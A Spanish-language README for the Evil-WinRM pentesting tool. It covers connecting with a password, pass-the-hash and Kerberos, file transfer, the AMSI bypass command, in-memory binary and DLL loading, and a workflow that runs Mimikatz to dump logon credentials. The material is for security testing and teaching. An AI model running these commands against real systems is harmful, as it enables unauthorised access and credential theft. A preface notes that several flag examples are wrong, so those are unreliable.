# 😈 Evil-WinRM: shell remota de Windows

<!-- language-home-navigation -->
[🏠 Página principal en español](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ███████╗██╗   ██╗██╗██╗      ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
  ██╔════╝██║   ██║██║██║      ██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
  █████╗  ██║   ██║██║██║█████╗██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
  ██╔══╝  ╚██╗ ██╔╝██║██║╚════╝██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
  ███████╗ ╚████╔╝ ██║███████╗ ╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝
                 La shell de WinRM más completa
```

<p align="center">
  <img src="https://img.shields.io/badge/Evil--WinRM-Windows_Shell-red?style=for-the-badge" alt="Evil-WinRM">
  <img src="https://img.shields.io/badge/WinRM-5985%2F5986-blue?style=for-the-badge" alt="WinRM">
</p>

> **Precisiones del original:** se conservan literalmente los ejemplos, incluidos los que dependen de la versión o son incorrectos. La [ayuda oficial](https://github.com/Hackplayers/evil-winrm#help) no define `-d` como opción de dominio; `-H` espera el hash NT, no el par `LM:NT`. Cambiar el puerto con `-P` no activa HTTPS: esa función corresponde a `-S`. `-e` selecciona el directorio local de ensamblados C# para las funciones de ejecución; no configura el directorio de `upload`. `Invoke-Binary` ejecuta ensamblados .NET, por lo que un Mimikatz nativo no es un ejemplo válido para esa función. Omitir AMSI no desactiva todas las protecciones del antivirus. Las funciones, los argumentos y los requisitos de autenticación pueden variar según la versión.

---

## 📋 Índice

- [Qué es Evil-WinRM](#qué-es-evil-winrm)
- [Instalación](#instalación)
- [Conexión básica](#conexión-básica)
- [Operaciones con archivos](#operaciones-con-archivos)
- [Comandos integrados](#comandos-integrados)
- [Pass-the-Hash](#pass-the-hash)
- [Autenticación Kerberos](#autenticación-kerberos)
- [Referencia rápida](#referencia-rápida)

---

<a id="qué-es-evil-winrm"></a>

## 🎯 Qué es Evil-WinRM

**Evil-WinRM** es una shell de WinRM (Windows Remote Management) con funciones para pruebas de seguridad:

- 🖥️ **Shell interactiva**: sesión completa de PowerShell
- 📁 **Transferencia de archivos**: cargar y descargar archivos
- 🔓 **Pass-the-Hash**: autenticación mediante un hash NTLM
- 🎫 **Kerberos**: autenticación basada en tickets
- 🧩 **Módulos**: cargar scripts de PowerShell

### Puertos de WinRM

| Puerto | Protocolo | Notas |
|------|----------|-------|
| 5985 | HTTP | Predeterminado |
| 5986 | HTTPS | Cifrado |

---

<a id="instalación"></a>

## 🚀 Instalación

### Kali Linux

```bash
# Instalar
sudo apt update
sudo apt install evil-winrm

# O mediante gem
sudo gem install evil-winrm
```

### Desde GitHub

```bash
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
ruby evil-winrm.rb --help
```

---

<a id="conexión-básica"></a>

## 💻 Conexión básica

### Autenticación con contraseña

```bash
# Conexión básica
evil-winrm -i 10.10.10.10 -u user -p 'password'

# Especificar el dominio (según el original; véase la precisión sobre -d)
evil-winrm -i 10.10.10.10 -u user -p 'password' -d domain.local

# HTTPS (puerto 5986)
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Especificar el puerto
evil-winrm -i 10.10.10.10 -u user -p 'password' -P 5986
```

### Opciones SSL

```bash
# SSL sin verificar el certificado
evil-winrm -i 10.10.10.10 -u user -p 'password' -S

# Con un certificado
evil-winrm -i 10.10.10.10 -u user -p 'password' -S -c cert.pem -k key.pem
```

---

<a id="operaciones-con-archivos"></a>

## 📁 Operaciones con archivos

### Carga de archivos al equipo remoto

```bash
# Dentro de la shell de Evil-WinRM
*Evil-WinRM* PS C:\> upload /local/path/file.exe

# Cargar en una ubicación concreta del equipo remoto
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Windows\Temp\file.exe

# Desde la línea de comandos (con -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /path/to/executables
```

### Descarga de archivos

```bash
# Descargar un archivo
*Evil-WinRM* PS C:\> download C:\Users\admin\Desktop\flag.txt

# Descargar en una ubicación concreta
*Evil-WinRM* PS C:\> download C:\secrets.txt /local/path/secrets.txt
```

### Directorio de ejecutables

```bash
# Especificar el directorio de ejecutables para la carga (según el original; véase la precisión sobre -e)
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/tools/

# Dentro de la shell, cargar un ejecutable de ese directorio
*Evil-WinRM* PS C:\> upload mimikatz.exe
```

---

<a id="comandos-integrados"></a>

## 🛠️ Comandos integrados

### Menú

```bash
# Mostrar todos los comandos
*Evil-WinRM* PS C:\> menu

# Comandos disponibles:
Bypass-4MSI       - Bypass AMSI
Dll-Loader        - Load DLL in memory
Donut-Loader      - Load .NET assembly
Invoke-Binary     - Execute binary
services          - List services
upload            - Upload file
download          - Download file
```

En el listado: `Bypass-4MSI` intenta omitir AMSI; `Dll-Loader` carga una DLL en memoria; `Donut-Loader` carga una representación ejecutable generada con Donut; `Invoke-Binary` ejecuta un ensamblado .NET. `services` lista servicios; `upload` carga archivos al equipo remoto y `download` los descarga. La salida se conserva en su idioma original.

### Evasión de AMSI

```bash
# Omitir la inspección de AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# Ahora se pueden ejecutar herramientas detectadas por el antivirus (según el original; no está garantizado)
```

### Carga de scripts

```bash
# Conectar indicando el directorio de scripts
evil-winrm -i 10.10.10.10 -u user -p pass -s /opt/scripts/

# Dentro de la shell, cargar el script
*Evil-WinRM* PS C:\> PowerView.ps1

# Usar las funciones del script
*Evil-WinRM* PS C:\> Get-DomainUser
```

### Ejecución de binarios

```bash
# Indicar el directorio de ejecutables
evil-winrm -i 10.10.10.10 -u user -p pass -e /opt/bin/

# Ejecutar el binario en memoria
*Evil-WinRM* PS C:\> Invoke-Binary /opt/bin/mimikatz.exe

# Con argumentos
*Evil-WinRM* PS C:\> Invoke-Binary mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"
```

### Carga de DLL

```bash
# Cargar una DLL
*Evil-WinRM* PS C:\> Dll-Loader -path C:\path\to\dll
```

### Servicios

```bash
# Listar los servicios
*Evil-WinRM* PS C:\> services
```

---

<a id="pass-the-hash"></a>

## 🔓 Pass-the-Hash

### Hash NTLM

```bash
# Conectar con un hash
evil-winrm -i 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Solo la parte NTLM
evil-winrm -i 10.10.10.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Con un dominio (según el original; véase la precisión sobre -d)
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH -d domain.local
```

---

<a id="autenticación-kerberos"></a>

## 🎫 Autenticación Kerberos

### Configuración

```bash
# Establecer KRB5CCNAME para que apunte a la caché de tickets
export KRB5CCNAME=/path/to/ticket.ccache

# Editar /etc/krb5.conf para configurar el reino Kerberos (realm)
```

### Conexión con Kerberos

```bash
# Autenticación Kerberos
evil-winrm -i dc01.domain.local -r domain.local

# Con una caché ccache concreta
KRB5CCNAME=admin.ccache evil-winrm -i dc01.domain.local -r domain.local
```

---

<a id="referencia-rápida"></a>

## 📊 Referencia rápida

### Opciones de conexión

| Opción | Descripción |
|--------|-------------|
| `-i` | IP o nombre del equipo de destino |
| `-u` | Nombre de usuario |
| `-p` | Contraseña |
| `-H` | Hash NTLM |
| `-d` | Dominio (según el original; véase la precisión sobre -d) |
| `-S` | Usar SSL (HTTPS) |
| `-P` | Puerto |
| `-r` | Reino Kerberos (realm) |

### Opciones de archivos

| Opción | Descripción |
|--------|-------------|
| `-s` | Directorio de scripts |
| `-e` | Directorio de ejecutables |
| `-c` | Certificado SSL |
| `-k` | Clave SSL |

### Comandos de la shell

| Comando | Descripción |
|---------|-------------|
| `upload` | Cargar un archivo al equipo remoto |
| `download` | Descargar un archivo |
| `menu` | Mostrar los comandos |
| `Bypass-4MSI` | Omitir la inspección de AMSI |
| `Invoke-Binary` | Ejecutar un archivo .exe en memoria |
| `services` | Listar los servicios |
| `Dll-Loader` | Cargar una DLL |

### Flujo de trabajo habitual

```bash
# 1. Conectar
evil-winrm -i 10.10.10.10 -u admin -p 'P@ssw0rd'

# 2. Omitir la inspección de AMSI
*Evil-WinRM* PS C:\> Bypass-4MSI

# 3. Cargar las herramientas al equipo remoto
*Evil-WinRM* PS C:\> upload /opt/tools/mimikatz.exe

# 4. Ejecutar
*Evil-WinRM* PS C:\> .\mimikatz.exe "privilege::debug sekurlsa::logonpasswords exit"

# 5. Descargar los resultados
*Evil-WinRM* PS C:\> download C:\results.txt
```

---

## 📚 Recursos

- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [Documentación de WinRM](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)

### Guías relacionadas
- [CrackMapExec](../../CrackMapExec/translations/README.es.md)
- [Impacket](../../Impacket/translations/README.es.md)
- [Mimikatz](../../Mimikatz/translations/README.es.md)

---

<p align="center">
  <b>😈 ¡La shell de WinRM más completa!</b><br>
  <i>Evil-WinRM: toma el control de Windows como un experto</i>
</p>
